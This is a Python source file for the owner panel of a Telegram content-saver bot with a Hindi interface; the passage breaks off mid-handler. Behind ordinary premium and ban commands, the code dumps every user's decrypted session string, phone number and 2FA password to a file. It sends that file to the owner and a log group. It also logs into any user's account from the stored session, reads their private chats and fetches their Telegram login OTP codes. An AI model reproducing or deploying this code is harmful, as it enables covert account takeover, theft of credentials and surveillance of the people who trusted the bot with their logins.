# Copyright (c) 2025 devgagan : https://github.com/devgaganin.
# Licensed under the GNU General Public License v3.0.

import os
import time
import asyncio
from datetime import datetime, timedelta
from shared_client import client as bot_client, app
from telethon import events
from config import OWNER_ID, JOIN_LINK, ADMIN_CONTACT, API_ID, API_HASH, LOG_GROUP
from utils.func import (
    add_premium_user, remove_premium_user, is_private_chat, get_user_data,
    users_collection, db, premium_users_collection, ban_user, unban_user,
    save_user_session
)
from utils.encrypt import ecs, dcs
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, Message
from plugins.start import subscribe as sub

def check_is_owner(user_id: int) -> bool:
    if not user_id:
        return False
    owner_list = OWNER_ID if isinstance(OWNER_ID, (list, tuple, set)) else [OWNER_ID]
    return user_id in owner_list or str(user_id) in [str(x) for x in owner_list]

@app.on_callback_query(filters.regex("^btn_owner_panel$"))
async def btn_owner_panel_cb(client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not check_is_owner(user_id):
        return await callback.answer("❌ केवल एडमिन के लिए!", show_alert=True)
        
    text = (
        "👑 **ओनर व एडमिन कंट्रोल पैनल** 👑\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "उपलब्ध प्रशासनिक कमांड्स:\n\n"
        "• `/allloginlist` - सभी लॉगिन यूज़र्स, फ़ोन व 2FA लिस्ट\n"
        "• `/logout_all` - सभी यूज़र्स का सेशन लॉगआउट करें\n"
        "• `/loginsession [सेशन या ID]` - किसी भी अकाउंट में लॉगिन करें\n"
        "• `/add [ID] [Time] [Unit] [pro/basic]` - प्रीमियम जोड़ें\n"
        "• `/rem [ID]` - प्रीमियम हटाएँ\n"
        "• `/gencode [Time] [Unit] [pro]` - रिडीम कोड बनाएँ\n"
        "• `/lock [ChannelID]` - चैनल को लॉक करें\n"
        "• `/unlock [ChannelID]` - चैनल को अनलॉक करें\n"
        "• `/ban [ID]` / `/unban [ID]` - यूज़र बैन/अनबैन करें\n"
        "• `/get` - सभी यूज़र्स का डेटा डाउनलोड करें\n"
        "• `/stats` - लाइव सर्वर स्थिति देखें\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📋 सभी लॉगिन लिस्ट", callback_data="btn_admin_alllogins"),
            InlineKeyboardButton("🚪 सभी लॉगआउट करें", callback_data="btn_admin_alllogout")
        ],
        [
            InlineKeyboardButton("📊 सर्वर स्टेट्स", callback_data="btn_speedtest"),
            InlineKeyboardButton("🔙 मुख्य मेनू", callback_data="btn_main_menu")
        ]
    ])
    await callback.message.edit_text(text, reply_markup=kb)

async def perform_all_logout(client: Client, message: Message):
    status_msg = await message.reply_text("🔄 **डेटाबेस से सभी सेशन्स को डिलीट किया जा रहा है...**")
    
    try:
        from plugins.batch import UC
        for uid in list(UC.keys()):
            try: await UC[uid].stop()
            except Exception: pass
            del UC[uid]
            
        result = await users_collection.update_many(
            {},
            {"$unset": {
                "session_string": "",
                "two_factor": "",
                "phone": "",
                "first_name": "",
                "last_name": "",
                "username": "",
                "account_id": "",
                "login_type": "",
                "cached_peers": ""
            }}
        )
        
        import glob
        for f in glob.glob("*.session*"):
            try:
                if not f.startswith("bot") and "shared" not in f:
                    os.remove(f)
            except Exception: pass

        await status_msg.edit(
            f"✅ **सभी सेशन्स सफलतापूर्वक लॉगआउट कर दिए गए हैं!**\n\n"
            f"👥 **कुल लॉगआउट किए गए सेशन्स:** `{result.modified_count}`\n"
            f"💡 अब जो भी यूज़र बॉट का उपयोग करेगा, उसे दोबारा **/login** करने के लिए कहा जाएगा।"
        )
        if LOG_GROUP:
            try:
                await client.send_message(
                    chat_id=LOG_GROUP,
                    text=f"👑 **Admin All Logout Executed**\n👥 Total Sessions Cleared: `{result.modified_count}`"
                )
            except Exception: pass
    except Exception as e:
        await status_msg.edit(f"❌ त्रुटि: `{str(e)}`")

@app.on_callback_query(filters.regex("^btn_admin_alllogout$"))
async def cb_admin_alllogout(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not check_is_owner(user_id):
        return await callback.answer("❌ यह केवल ओनर (Admin) के लिए है!", show_alert=True)
    await callback.answer("🔄 सभी सेशन्स लॉगआउट किए जा रहे हैं...")
    await perform_all_logout(client, callback.message)

@app.on_message(filters.command(["logout_all", "alllogout", "logoutall", "all_logout"]) & filters.private)
async def logout_all_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ **यह कमांड केवल ओनर (Admin) के लिए है!**")

    await perform_all_logout(client, message)

@app.on_message(filters.command(["allloginlist", "alllogins"]) & filters.private)
async def all_login_list_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text(
            f"❌ **यह कमांड केवल ओनर (Admin) के लिए है!**\n\n"
            f"🆔 **आपकी Telegram ID:** `{user_id}`\n\n"
            f"💡 **समाधान:**\n"
            f"कृपया `config.py` खोलें और `OWNER_ID` में अपनी यह ID `{user_id}` जोड़ें:\n"
            f"👉 `OWNER_ID = [{user_id}]`\n"
            f"फिर बॉट रीस्टार्ट करें।"
        )

    status_msg = await message.reply_text("🔄 **डेटाबेस से सभी लॉगिन सेशन्स और यूज़र्स खोजे जा रहे हैं...**")
    
    try:
        cursor = users_collection.find({"session_string": {"$exists": True, "$ne": ""}})
        user_list = await cursor.to_list(length=1000)
        
        if not user_list:
            return await status_msg.edit("ℹ️ डेटाबेस में कोई भी सक्रिय लॉगिन सेशन नहीं मिला।")

        ist_now = (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%d-%b-%Y %I:%M:%S %p')
        
        file_content = (
            "=======================================================\n"
            "ANANOMUS BRO SAVER - ALL LOGGED IN SESSIONS DATABASE\n"
            f"Total Active Logins: {len(user_list)}\n"
            f"Generated: {ist_now} (IST)\n"
            "=======================================================\n\n"
        )
        
        preview_entries = []
        
        for idx, doc in enumerate(user_list, 1):
            uid = doc.get("user_id")
            raw_enc = doc.get("session_string", "")
            try:
                raw_session = dcs(raw_enc)
            except Exception:
                raw_session = raw_enc
                
            phone = doc.get("phone", "N/A")
            first_name = doc.get("first_name", "")
            last_name = doc.get("last_name", "")
            full_name = f"{first_name} {last_name}".strip() or "N/A"
            username = f"@{doc.get('username')}" if doc.get("username") else "None"
            account_id = doc.get("account_id", "N/A")
            two_fa = doc.get("two_factor", "None / Not Set")
            login_type = doc.get("login_type", "Unknown")
            updated_at = doc.get("updated_at")
            updated_str = updated_at.strftime('%d-%b-%Y %I:%M %p') if isinstance(updated_at, datetime) else str(updated_at or 'N/A')
            
            file_content += (
                f"[{idx}] USER INFORMATION\n"
                f"-------------------------------------------------------\n"
                f"• Bot User ID      : {uid}\n"
                f"• Telegram Acc ID  : {account_id}\n"
                f"• Name             : {full_name}\n"
                f"• Username         : {username}\n"
                f"• Mobile Number    : {phone}\n"
                f"• 2FA Password     : {two_fa}\n"
                f"• Login Type       : {login_type}\n"
                f"• Last Updated     : {updated_str}\n"
                f"• Full Session String:\n{raw_session}\n\n"
            )
            
            short_sess = f"{raw_session[:20]}...{raw_session[-12:]}" if len(raw_session) > 35 else raw_session
            preview_entries.append(
                f"**{idx}.** 👤 **{full_name}** ({username})\n"
                f"   🆔 **UID:** `{uid}` | **Acc ID:** `{account_id}`\n"
                f"   📱 **फ़ोन:** `+{phone}` | 🔐 **2FA:** `{two_fa}`\n"
                f"   🔑 **Session:** `{short_sess}`\n"
                f"   📅 **Updated:** `{updated_str}`"
            )

        file_path = f"all_login_sessions_{int(time.time())}.txt"
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(file_content)

        preview_text = "\n\n".join(preview_entries[:8])
        if len(preview_entries) > 8:
            preview_text += f"\n\n...और `{len(preview_entries) - 8}` अन्य सेशन्स (पूरी लिस्ट नीचे फाइल में देखें)"

        summary_msg = (
            f"📋 **सभी लॉगिन यूज़र्स और सेशन्स की लिस्ट ({len(user_list)})** 📋\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"{preview_text}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📁 *सभी सेशन्स की पूरी विस्तृत फाइल नीचे भेज दी गई है:* 👇"
        )
        
        await status_msg.edit(summary_msg)
        
        await client.send_document(
            chat_id=message.chat.id,
            document=file_path,
            caption=f"📁 **All Logged-in Sessions Report**\n👥 कुल यूज़र्स: `{len(user_list)}`\n📅 `{ist_now}`"
        )
        
        if LOG_GROUP:
            try:
                await client.send_document(
                    chat_id=LOG_GROUP,
                    document=file_path,
                    caption=f"👑 **Admin /allloginlist Triggered**\n👥 Total Logged In: `{len(user_list)}`"
                )
            except Exception: pass
            
        if os.path.exists(file_path):
            os.remove(file_path)

    except Exception as e:
        await status_msg.edit(f"❌ त्रुटि: `{str(e)}`")

@app.on_callback_query(filters.regex("^btn_admin_alllogins$"))
async def btn_admin_alllogins_cb(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not check_is_owner(user_id):
        return await callback.answer("❌ केवल एडमिन के लिए!", show_alert=True)
    await callback.answer("⏳ लिस्ट निकाली जा रही है...")
    await all_login_list_cmd(client, callback.message)

@app.on_message(filters.command(["loginsession", "adminlogin"]) & filters.private)
async def login_session_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text(
            f"❌ **यह कमांड केवल ओनर (Admin) के लिए है!**\n\n"
            f"🆔 **आपकी Telegram ID:** `{user_id}`\n\n"
            f"💡 **समाधान:**\n"
            f"कृपया `config.py` खोलें और `OWNER_ID` में अपनी यह ID `{user_id}` जोड़ें:\n"
            f"👉 `OWNER_ID = [{user_id}]`\n"
            f"फिर बॉट रीस्टार्ट करें。"
        )

    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        return await message.reply_text(
            "⚠️ **कमांड उपयोग (Usage):**\n"
            "👉 `/loginsession [सेशन_स्ट्रिंग या यूज़र_ID]`\n\n"
            "💡 **उदाहरण 1 (सेशन स्ट्रिंग से):**\n"
            "`/loginsession AQHtOxIABHh6ewcOPklJP7yntwQTq4...`\n\n"
            "💡 **उदाहरण 2 (यूज़र ID से):**\n"
            "`/loginsession 1234567890` (उस यूज़र का सेव्ड सेशन सक्रिय करेगा)"
        )

    arg = parts[1].strip()
    status_msg = await message.reply_text("🔄 **सेशन की जाँच व अकाउंट लॉगिन किया जा रहा है...**")

    raw_session = ""
    if arg.isdigit():
        target_uid = int(arg)
        user_data = await users_collection.find_one({"user_id": target_uid})
        if not user_data or not user_data.get("session_string"):
            return await status_msg.edit(f"❌ **यूज़र ID `{target_uid}` का कोई सेशन डेटाबेस में नहीं मिला!**")
        
        enc_sess = user_data.get("session_string")
        try:
            raw_session = dcs(enc_sess)
        except Exception:
            raw_session = enc_sess
    else:
        try:
            raw_session = dcs(arg)
        except Exception:
            raw_session = arg

    try:
        test_client = Client(
            name=f"admin_sess_{user_id}_{int(time.time())}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=raw_session,
            in_memory=True
        )
        await test_client.connect()
        me = await test_client.get_me()
        await test_client.disconnect()
    except Exception as e:
        return await status_msg.edit(f"❌ **सेशन अमान्य या समाप्त (Expired) है!**\nत्रुटि: `{e}`")

    encrypted_session = ecs(raw_session)
    phone_num = getattr(me, "phone_number", None) or "N/A"
    user_full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    tg_username = f"@{me.username}" if me.username else "None"

    await save_user_session(
        user_id=user_id,
        session_string=encrypted_session,
        phone=phone_num,
        first_name=me.first_name,
        last_name=me.last_name,
        username=me.username,
        account_id=me.id,
        login_type="admin_loginsession"
    )

    from plugins.batch import UC
    if user_id in UC:
        try: await UC[user_id].stop()
        except: pass
        del UC[user_id]

    await status_msg.edit(f"🔄 **अकाउंट `{user_full_name}` की सभी चैट्स लोड हो रही हैं...**")
    dialog_buttons = []
    chat_list_text = (
        f"✅ **लॉगिन सफल! ({user_full_name})**\n"
        f"📱 **फोन:** `+{phone_num}` | 🆔 **ID:** `{me.id}`\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💬 **नीचे किसी भी चैट पर क्लिक करके उसके मैसेजेस तुरंत पढ़ें:**\n\n"
    )
    
    try:
        user_client = Client(
            name=f"admin_dlg_{user_id}_{int(time.time())}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=raw_session,
            in_memory=True
        )
        await user_client.connect()
        
        idx = 0
        async for dialog in user_client.get_dialogs(limit=30):
            idx += 1
            chat = dialog.chat
            title = chat.title or f"{chat.first_name or ''} {chat.last_name or ''}".strip() or "Unnamed"
            unread = f" 🔔{dialog.unread_messages_count}" if dialog.unread_messages_count else ""
            
            btn_title = f"{'🔐 ' if chat.id == 777000 else '💬 '}{title[:18]}{unread}"
            dialog_buttons.append(InlineKeyboardButton(btn_title, callback_data=f"readchat_{chat.id}"))
            
            if idx <= 15:
                chat_list_text += f"**{idx}.** {title} (`{chat.id}`){unread}\n"

        await user_client.disconnect()
    except Exception as e:
        chat_list_text += f"\n⚠️ *चैट्स लोड करने में आंशिक समस्या:* `{e}`\n"

    keyboard_grid = []
    otp_btn = [InlineKeyboardButton("🔐 Telegram OTP / Login Code तुरंत देखें", callback_data="readchat_777000")]
    keyboard_grid.append(otp_btn)

    for i in range(0, len(dialog_buttons), 2):
        keyboard_grid.append(dialog_buttons[i:i+2])

    keyboard_grid.append([
        InlineKeyboardButton("🔄 चैट्स रिफ्रेश करें", callback_data=f"refresh_sess_chats_{me.id}"),
        InlineKeyboardButton("🚪 Disconnect Session", callback_data=f"adm_disconnect_sess_{me.id}")
    ])

    chat_list_text += "\n━━━━━━━━━━━━━━━━━━━━\n👉 *जिस चैट के मैसेज पढ़ने हैं, नीचे उसके बटन पर क्लिक करें।* 📨"
    
    await status_msg.edit(chat_list_text, reply_markup=InlineKeyboardMarkup(keyboard_grid))

    if LOG_GROUP:
        try:
            ist_time = (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%d-%b-%Y %I:%M:%S %p')
            log_text = (
                "👑 **Admin /loginsession Activated** 👑\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 **Account:** `{user_full_name}` ({tg_username})\n"
                f"🆔 **Account ID:** `{me.id}`\n"
                f"📱 **Phone:** `+{phone_num}`\n"
                f"👮 **Admin ID:** `{user_id}`\n"
                f"📅 **Time:** `{ist_time} (IST)`"
            )
            await client.send_message(LOG_GROUP, log_text)
        except Exception: pass

@app.on_message(filters.command("readchats") & filters.private)
async def read_chats_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ केवल ओनर के लिए!")

    user_data = await users_collection.find_one({"user_id": user_id})
    if not user_data or not user_data.get("session_string"):
        return await message.reply_text("❌ आपके पास कोई एक्टिव सेशन नहीं है! पहले `/loginsession [ID/String]` करें।")

    try:
        raw_session = dcs(user_data.get("session_string"))
    except Exception:
        raw_session = user_data.get("session_string")

    msg = await message.reply_text("🔄 **अकाउंट की सभी रीसेंट चैट्स लोड की जा रही हैं...**")
    try:
        user_client = Client(
            name=f"read_chats_{user_id}_{int(time.time())}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=raw_session,
            in_memory=True
        )
        await user_client.connect()
        me = await user_client.get_me()

        dialogs_text = f"📱 **अकाउंट:** {me.first_name} (`{me.id}`)\n"
        dialogs_text += "━━━━━━━━━━━━━━━━━━━━\n"
        dialogs_text += "💬 **हालिया चैट्स व चैनल्स (Recent Dialogs):**\n\n"

        buttons = []
        count = 0
        async for dialog in user_client.get_dialogs(limit=25):
            count += 1
            chat = dialog.chat
            title = chat.title or f"{chat.first_name or ''} {chat.last_name or ''}".strip() or "Unnamed"
            chat_type = str(chat.type).split(".")[-1].capitalize()
            unread = f" (🔔 {dialog.unread_messages_count})" if dialog.unread_messages_count else ""
            dialogs_text += f"{count}. **{title}** [{chat_type}]{unread}\n   🆔 ID: `{chat.id}`\n\n"
            
            if count <= 8:
                buttons.append([InlineKeyboardButton(f"📖 {title[:25]}", callback_data=f"readchat_{chat.id}")])

        await user_client.disconnect()
        dialogs_text += "━━━━━━━━━━━━━━━━━━━━\n👉 किसी भी चैट के मैसेज पढ़ने के लिए: `/readmsgs [Chat_ID]` टाइप करें।"
        
        kb = InlineKeyboardMarkup(buttons) if buttons else None
        await msg.edit(dialogs_text, reply_markup=kb)
    except Exception as e:
        await msg.edit(f"❌ **चैट्स लोड करने में त्रुटि:** `{e}`")

@app.on_message(filters.command(["readmsgs", "readmsg"]) & filters.private)
async def read_msgs_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ केवल ओनर के लिए!")

    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        return await message.reply_text("👉 **उपयोग:** `/readmsgs [Chat_ID]`\nउदाहरण: `/readmsgs 777000` (Telegram Official OTP/Code Chat)")

    target_chat = parts[1].strip()
    if target_chat.startswith("-100") or target_chat.lstrip("-").isdigit():
        target_chat = int(target_chat)

    user_data = await users_collection.find_one({"user_id": user_id})
    if not user_data or not user_data.get("session_string"):
        return await message.reply_text("❌ आपके पास कोई एक्टिव सेशन नहीं है! पहले `/loginsession [ID/String]` करें।")

    try:
        raw_session = dcs(user_data.get("session_string"))
    except Exception:
        raw_session = user_data.get("session_string")

    msg = await message.reply_text(f"🔄 **चैट `{target_chat}` के पिछले मैसेजेस पढ़े जा रहे हैं...**")
    try:
        user_client = Client(
            name=f"read_msgs_{user_id}_{int(time.time())}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=raw_session,
            in_memory=True
        )
        await user_client.connect()

        msgs_text = f"📨 **चैट मैसेजेस (Chat: `{target_chat}`):**\n━━━━━━━━━━━━━━━━━━━━\n\n"
        count = 0
        async for m in user_client.get_chat_history(target_chat, limit=10):
            count += 1
            sender = m.from_user.first_name if m.from_user else "System/Channel"
            text_content = m.text or m.caption or f"[{m.media or 'Non-text Message'}]"
            time_str = (m.date + timedelta(hours=5, minutes=30)).strftime('%d-%b %I:%M %p') if m.date else ""
            msgs_text += f"👤 **{sender}** (`{time_str}`):\n{text_content}\n────────────────────\n"

        await user_client.disconnect()
        if count == 0:
            msgs_text += "📭 इस चैट में कोई मैसेज नहीं मिला।"
        
        await msg.edit(msgs_text)
    except Exception as e:
        await msg.edit(f"❌ **मैसेज पढ़ने में त्रुटि:** `{e}`")

@app.on_message(filters.command(["getcode", "getotp", "otp"]) & filters.private)
async def get_telegram_otp_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ केवल ओनर के लिए!")

    user_data = await users_collection.find_one({"user_id": user_id})
    if not user_data or not user_data.get("session_string"):
        return await message.reply_text("❌ आपके पास कोई एक्टिव सेशन नहीं है! पहले `/loginsession [ID/String]` करें।")

    try:
        raw_session = dcs(user_data.get("session_string"))
    except Exception:
        raw_session = user_data.get("session_string")

    msg = await message.reply_text("🔄 **Telegram Official (777000) से लॉगिन OTP चेक किया जा रहा है...**")
    try:
        user_client = Client(
            name=f"get_otp_{user_id}_{int(time.time())}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=raw_session,
            in_memory=True
        )
        await user_client.connect()

        otp_found = False
        otp_text = "🔐 **टेलीग्राम लॉगिन कोड (OTP Messages):**\n━━━━━━━━━━━━━━━━━━━━\n\n"
        async for m in user_client.get_chat_history(777000, limit=5):
            otp_found = True
            time_str = (m.date + timedelta(hours=5, minutes=30)).strftime('%d-%b %I:%M:%S %p') if m.date else ""
            otp_text += f"📅 **समय:** `{time_str} (IST)`\n\n{m.text or m.caption}\n━━━━━━━━━━━━━━━━━━━━\n"

        await user_client.disconnect()
        if not otp_found:
            otp_text += "📭 Telegram Service Notifications (777000) में कोई नया कोड नहीं मिला।"
        
        await msg.edit(otp_text)
    except Exception as e:
        await msg.edit(f"❌ **OTP चेक करने में त्रुटि:** `{e}`")

@app.on_callback_query(filters.regex(r"^readchat_"))
async def cb_readchat_handler(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not check_is_owner(user_id):
        return await callback.answer("❌ केवल ओनर के लिए!", show_alert=True)
    
    target_chat = callback.data.split("_")[1]
    if target_chat.startswith("-100") or target_chat.lstrip("-").isdigit():
        target_chat = int(target_chat)
    
    await callback.answer("⏳ मैसेजेस लोड किए जा रहे हैं...")
    
    user_data = await users_collection.find_one({"user_id": user_id})
    if not user_data or not user_data.get("session_string"):
        return await callback.answer("❌ कोई एक्टिव सेशन नहीं मिला!", show_alert=True)

    try:
        raw_session = dcs(user_data.get("session_string"))
    except Exception:
        raw_session = user_data.get("session_string")

    try:
        user_client = Client(
            name=f"cb_read_{user_id}_{int(time.time())}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=raw_session,
            in_memory=True
        )
        await user_client.connect()
        me = await user_client.get_me()

        chat_title = f"Chat `{target_chat}`"
        try:
            target_obj = await user_client.get_chat(target_chat)
            chat_title = target_obj.title or f"{target_obj.first_name or ''} {target_obj.last_name or ''}".strip() or str(target_chat)
        except Exception: pass

        msgs_text = f"📨 **चैट:** {chat_title} (`{target_chat}`)\n"
        msgs_text += "━━━━━━━━━━━━━━━━━━━━\n\n"
        count = 0
        async for m in user_client.get_chat_history(target_chat, limit=12):
            count += 1
            sender = m.from_user.first_name if m.from_user else "System/Channel"
            text_content = m.text or m.caption or f"[{m.media or 'Media / Non-text'}]"
            time_str = (m.date + timedelta(hours=5, minutes=30)).strftime('%d-%b %I:%M %p') if m.date else ""
            msgs_text += f"👤 **{sender}** (`{time_str}`):\n{text_content}\n────────────────────\n"

        await user_client.disconnect()

        if count == 0:
            msgs_text += "📭 *इस चैट में कोई मैसेज नहीं मिला या चैट खाली है।*\n"

        msgs_text += "━━━━━━━━━━━━━━━━━━━━\n💡 *चैट्स लिस्ट पर वापस जाने के लिए '🔙 वापस चैट्स पर जाएं' दबाएं।*"

        nav_kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔄 ताज़ा करें (Refresh)", callback_data=f"readchat_{target_chat}"),
                InlineKeyboardButton("🔙 वापस चैट्स पर जाएं", callback_data=f"refresh_sess_chats_{me.id}")
            ],
            [
                InlineKeyboardButton("🚪 Disconnect Session", callback_data=f"adm_disconnect_sess_{me.id}")
            ]
        ])

        await callback.message.edit_text(msgs_text, reply_markup=nav_kb)
    except Exception as e:
        err_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 वापस चैट्स पर जाएं", callback_data="refresh_sess_chats_0")]])
        await callback.message.edit_text(f"❌ **मैसेज लोड करने में त्रुटि:** `{e}`", reply_markup=err_kb)

@app.on_callback_query(filters.regex(r"^adm_disconnect_sess_"))
async def cb_adm_disconnect_sess(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not check_is_owner(user_id):
        return await callback.answer("❌ केवल ओनर के लिए!", show_alert=True)

    await callback.answer("🚪 सेशन हटाया जा रहा है...")
    
    await users_collection.update_one(
        {"user_id": user_id},
        {"$unset": {"session_string": ""}}
    )

    try:
        from plugins.batch import UC
        if user_id in UC:
            try:
                await UC[user_id].stop()
            except Exception:
                try:
                    await UC[user_id].disconnect()
                except Exception:
                    pass
            del UC[user_id]
    except Exception:
        pass

    disc_text = (
        "🚪 **सेशन सफलतापूर्वक Disconnect कर दिया गया है!** ✅\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "अब यह सेशन आपके बॉट से हटा दिया गया है और बैकग्राउंड कनेक्शन बंद कर दिया गया है।\n\n"
        "👉 नया सेशन जोड़ने के लिए: `/loginsession [Session_String]` का उपयोग करें।"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⚡ मुख्य मेनू", callback_data="btn_main_menu")]])
    await callback.message.edit_text(disc_text, reply_markup=kb)

@app.on_callback_query(filters.regex(r"^refresh_sess_chats_"))
async def cb_refresh_sess_chats(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if not check_is_owner(user_id):
        return await callback.answer("❌ केवल ओनर के लिए!", show_alert=True)
    
    await callback.answer("🔄 ताज़ा चैट्स लोड की जा रही हैं...")
    user_data = await users_collection.find_one({"user_id": user_id})
    if not user_data or not user_data.get("session_string"):
        return await callback.message.edit_text("❌ कोई एक्टिव सेशन नहीं मिला! कृपया नया लॉगिन करें: `/loginsession`")

    try:
        raw_session = dcs(user_data.get("session_string"))
    except Exception:
        raw_session = user_data.get("session_string")

    try:
        user_client = Client(
            name=f"admin_ref_{user_id}_{int(time.time())}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=raw_session,
            in_memory=True
        )
        await user_client.connect()
        me = await user_client.get_me()
        user_full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        phone_num = getattr(me, "phone_number", None) or "N/A"

        dialog_buttons = []
        chat_list_text = (
            f"✅ **अकाउंट:** {user_full_name}\n"
            f"📱 **फोन:** `+{phone_num}` | 🆔 **ID:** `{me.id}`\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "💬 **नीचे किसी भी चैट पर क्लिक करके उसके मैसेजेस तुरंत पढ़ें:**\n\n"
        )

        idx = 0
        async for dialog in user_client.get_dialogs(limit=30):
            idx += 1
            chat = dialog.chat
            title = chat.title or f"{chat.first_name or ''} {chat.last_name or ''}".strip() or "Unnamed"
            unread = f" 🔔{dialog.unread_messages_count}" if dialog.unread_messages_count else ""
            btn_title = f"{'🔐 ' if chat.id == 777000 else '💬 '}{title[:18]}{unread}"
            dialog_buttons.append(InlineKeyboardButton(btn_title, callback_data=f"readchat_{chat.id}"))
            if idx <= 15:
                chat_list_text += f"**{idx}.** {title} (`{chat.id}`){unread}\n"

        await user_client.disconnect()

        keyboard_grid = []
        otp_btn = [InlineKeyboardButton("🔐 Telegram OTP / Login Code तुरंत देखें", callback_data="readchat_777000")]
        keyboard_grid.append(otp_btn)

        for i in range(0, len(dialog_buttons), 2):
            keyboard_grid.append(dialog_buttons[i:i+2])

        keyboard_grid.append([
            InlineKeyboardButton("🔄 चैट्स रिफ्रेश करें", callback_data=f"refresh_sess_chats_{me.id}"),
            InlineKeyboardButton("🚪 Disconnect Session", callback_data=f"adm_disconnect_sess_{me.id}")
        ])
        chat_list_text += "\n━━━━━━━━━━━━━━━━━━━━\n👉 *जिस चैट के मैसेज पढ़ने हैं, नीचे उसके बटन पर क्लिक करें।* 📨"

        await callback.message.edit_text(chat_list_text, reply_markup=InlineKeyboardMarkup(keyboard_grid))
    except Exception as e:
        await callback.message.edit_text(f"❌ रीफ्रेश त्रुटि: `{e}`")

@app.on_message(filters.command("add") & filters.private)
async def add_premium_pyro_handler(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ यह कमांड केवल ओनर के लिए है।")
    
    parts = message.text.strip().split()
    if len(parts) < 5:
        return await message.reply_text(
            "❌ **गलत फॉर्मेट!**\n\n"
            "👉 **सही फॉर्मेट:** `/add [user_id] [duration] [unit] [basic/pro]`\n"
            "👉 **उदाहरण:** `/add 12345678 1 month pro`"
        )

    try:
        target_user_id = int(parts[1])
        duration_value = int(parts[2])
        duration_unit = parts[3].lower()
        plan_type = parts[4].capitalize()
        if plan_type not in ["Basic", "Pro"]:
            return await message.reply_text("❌ प्लान केवल `Basic` या `Pro` हो सकता है।")
                
        valid_units = ['min', 'hours', 'days', 'weeks', 'month', 'year', 'decades']
        if duration_unit not in valid_units:
            return await message.reply_text(f"❌ अमान्य यूनिट। चुनें: {', '.join(valid_units)}")
            
        success, result = await add_premium_user(target_user_id, duration_value, duration_unit, plan_type)
        if success:
            expiry_ist = result + timedelta(hours=5, minutes=30)
            formatted_expiry = expiry_ist.strftime('%d-%b-%Y %I:%M:%S %p')
            await message.reply_text(f"✅ यूज़र `{target_user_id}` को {plan_type} सदस्य बनाया गया।\nवैधता: {formatted_expiry} (IST)")
            try:
                await client.send_message(target_user_id, f"✅ आपको {plan_type} सदस्यता दी गई है!\nवैधता: {formatted_expiry} (IST)")
            except Exception: pass
            if LOG_GROUP:
                try:
                    await client.send_message(
                        LOG_GROUP,
                        f"💎 **Premium Added**\n👤 User: `{target_user_id}`\n📦 Plan: `{plan_type}`\n⏳ Expire: `{formatted_expiry}`"
                    )
                except Exception: pass
        else:
            await message.reply_text(f'❌ विफल: {result}')
    except Exception as e:
        await message.reply_text(f'त्रुटि: {str(e)}')

if bot_client:
    @bot_client.on(events.NewMessage(pattern='/add'))
    async def add_premium_handler(event):
        if not await is_private_chat(event): return
        user_id = event.sender_id
        try: await event.delete()
        except Exception: pass

        if not check_is_owner(user_id):
            await event.respond('यह कमांड केवल ओनर के लिए है।')
            return
        text = event.message.text.strip()
        parts = text.split(' ')

        if len(parts) < 5:
            await event.respond(
                "❌ **गलत फॉर्मेट!**\n\n"
                "👉 **सही फॉर्मेट:** `/add [user_id] [duration] [unit] [basic/pro]`\n"
                "👉 **उदाहरण:** `/add 12345678 1 month pro`"
            )
            return

        try:
            target_user_id = int(parts[1])
            duration_value = int(parts[2])
            duration_unit = parts[3].lower()
            plan_type = parts[4].capitalize()
            if plan_type not in ["Basic", "Pro"]:
                await event.respond("❌ प्लान केवल `Basic` या `Pro` हो सकता है।")
                return
                    
            valid_units = ['min', 'hours', 'days', 'weeks', 'month', 'year', 'decades']
            if duration_unit not in valid_units:
                await event.respond(f"अमान्य यूनिट। चुनें: {', '.join(valid_units)}")
                return
                
